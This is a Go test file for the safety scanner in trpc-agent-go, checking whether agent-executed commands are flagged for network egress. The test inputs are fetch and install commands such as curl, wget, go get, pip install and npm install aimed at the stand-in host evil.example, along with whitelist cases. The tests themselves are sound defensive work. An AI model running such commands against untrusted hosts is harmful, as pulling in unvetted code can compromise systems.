//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"testing"
)

// assertNoRule fails the test if the report contains a risk with the
// given rule ID.
func assertNoRule(t *testing.T, report *ScanReport, ruleID string) {
	t.Helper()
	for _, r := range report.Risks {
		if r.RuleID == ruleID {
			t.Errorf("expected no rule %q in risks, got %v", ruleID, report.Risks)
			return
		}
	}
}

// scannerWithPolicy returns a scanner built from the test default policy
// (DefaultVerdict=Allow) after applying mutate.  Using a fresh policy per
// test keeps the default whitelist intact while individual tests extend it.
func scannerWithPolicy(t *testing.T, mutate func(*Policy)) *Scanner {
	t.Helper()
	p := defaultTestPolicy(t)
	if mutate != nil {
		mutate(p)
	}
	s, err := NewScanner(p)
	if err != nil {
		t.Fatalf("NewScanner: %v", err)
	}
	return s
}

// allowCommand is a policy mutator that adds a command to the allow list.
func allowCommand(name string) func(*Policy) {
	return func(p *Policy) {
		p.Commands.Allowed = append(p.Commands.Allowed, name)
	}
}

// whitelistHost is a policy mutator that adds a host to the whitelist.
func whitelistHost(host string) func(*Policy) {
	return func(p *Policy) {
		p.NetworkWhitelist = append(p.NetworkWhitelist, host)
	}
}

func TestNetworkEgress_SchemelessGoGetNonWhitelisted(t *testing.T) {
	s := newTestScanner(t)
	report := scan(t, s, "go get evil.example/pkg", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_SchemelessGoInstallNonWhitelisted(t *testing.T) {
	s := newTestScanner(t)
	report := scan(t, s, "go install evil.example/cmd@latest", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_CurlSchemelessNonWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, allowCommand("curl"))
	report := scan(t, s, "curl evil.example", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_CurlSchemelessWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, func(p *Policy) {
		allowCommand("curl")(p)
		whitelistHost("evil.example")(p)
	})
	report := scan(t, s, "curl evil.example", BackendWorkspaceExec)
	assertNoRule(t, report, "network_egress")
	assertVerdict(t, report, VerdictAllow)
}

func TestNetworkEgress_WgetSchemelessNonWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, allowCommand("wget"))
	report := scan(t, s, "wget evil.example/archive.tar.gz", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_PipInstallSchemelessNonWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, allowCommand("pip"))
	report := scan(t, s, "pip install evil.example/package", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_NpmInstallSchemelessNonWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, allowCommand("npm"))
	report := scan(t, s, "npm install evil.example/pkg", BackendWorkspaceExec)
	assertHasRule(t, report, "network_egress")
}

func TestNetworkEgress_SchemelessGoGetWhitelisted(t *testing.T) {
	s := scannerWithPolicy(t, whitelistHost("evil.example"))
	report := scan(t, s, "go get evil.example/pkg", BackendWorkspaceExec)
	assertNoRule(t, report, "network_egress")
}

func TestNetworkEgress_WhitelistedSchemeLessHostAllowed(t *testing.T) {
	s := scannerWithPolicy(t, func(p *Policy) {
		allowCommand("curl")(p)
		whitelistHost("evil.example")(p)
	})
	report := scan(t, s, "curl evil.example", BackendWorkspaceExec)
	assertVerdict(t, report, VerdictAllow)
}

func TestNetworkEgress_BarePackageNameNotAHost(t *testing.T) {
	s := scannerWithPolicy(t, allowCommand("pip"))
	report := scan(t, s, "pip install requests", BackendWorkspaceExec)
	assertNoRule(t, report, "network_egress")
}
